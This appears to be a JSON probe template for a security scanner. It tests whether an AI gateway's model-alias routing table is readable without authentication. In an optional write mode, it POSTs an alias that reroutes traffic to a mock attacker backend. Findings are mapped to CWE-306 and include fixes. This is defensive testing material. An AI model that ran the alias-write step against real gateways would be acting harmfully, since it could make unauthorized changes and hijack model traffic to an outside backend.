{
  "schema": "inkblade-probe-template-v1",
  "key": "aigateway-route-hijack",
  "version": "1.0.0",
  "meta": {
    "name": {
      "zh": "AI 网关模型别名路由劫持",
      "en": "AI Gateway Model Alias Route Hijack"
    },
    "series": "横向利用",
    "min_level": "利用验证",
    "writes": true,
    "requires": [],
    "surfaces": [],
    "cves": [],
    "fidelity": "equivalent"
  },
  "inputs": {
    "target": {
      "from": "params.target",
      "required": true
    }
  },
  "defaults": {
    "timeout_ms": 8000,
    "tls_verify": false
  },
  "payloads": {
    "benign": {
      "marker": "INKBLADE-BENIGN"
    },
    "attack": {
      "marker": "{{ctx.marker}}",
      "note": "lab-only probe"
    }
  },
  "limits": {
    "timeout_ms": 30000,
    "max_http_requests": 24
  },
  "modes": {
    "probe_only": true,
    "backup_write": true,
    "requires_backup": true
  },
  "computed": {
    "anon_read": "steps.route.status == 200 and steps.route.json.session == 'anonymous-admin'",
    "aliases": "count(steps.route.json.aliases)",
    "applied": "steps.alias.status == 200 and steps.alias.json.applied == true"
  },
  "steps": [
    {
      "id": "route",
      "op": "http",
      "method": "GET",
      "url": "{{input.target}}/ai/route",
      "save": "route",
      "allow_failure": true
    },
    {
      "id": "alias",
      "op": "http",
      "method": "POST",
      "write": true,
      "when": "params.mode == 'backup-write'",
      "url": "{{input.target}}/ai/model-alias",
      "headers": {
        "Content-Type": "application/json"
      },
      "body": {
        "alias": "inkblade-demo-alias",
        "backend": "http://upstream-inkblade.mock/v1",
        "visibility": "private"
      },
      "save": "alias",
      "allow_failure": true
    }
  ],
  "findings": [
    {
      "id": "anon",
      "when": "computed.anon_read",
      "sev": "high",
      "title": "AI 路由表未鉴权可读：模型别名→后端映射暴露（anonymous-admin）",
      "detail": "aliases={{computed.aliases}} allowlist={{str(steps.route.json.allowlist)}}",
      "evidence": "{{steps.route.sha256}}",
      "mapping": "CWE-306 缺失鉴权",
      "fix": "路由表按调用主体过滤；管理面强制鉴权"
    },
    {
      "id": "write",
      "when": "params.mode == 'backup-write' and computed.applied",
      "sev": "high",
      "title": "模型别名可被低权写入：路由劫持到攻击者后端",
      "detail": "alias={{steps.alias.json.alias}} backend={{steps.alias.json.backend}}",
      "evidence": "{{steps.alias.sha256}}",
      "mapping": "supply-chain-route-hijack",
      "fix": "别名写入仅管理面；backend allowlist 强校验"
    },
    {
      "id": "clean",
      "when": "not computed.anon_read",
      "sev": "info",
      "title": "AI 路由表按租户/鉴权隔离",
      "detail": "status={{steps.route.status}}"
    }
  ],
  "artifacts": [
    {
      "name": "aigateway-route-hijack.json",
      "kind": "json",
      "fields": {
        "anon_read": "computed.anon_read",
        "aliases": "computed.aliases",
        "route_status": "steps.route.status",
        "mode": "params.mode"
      }
    }
  ]
}
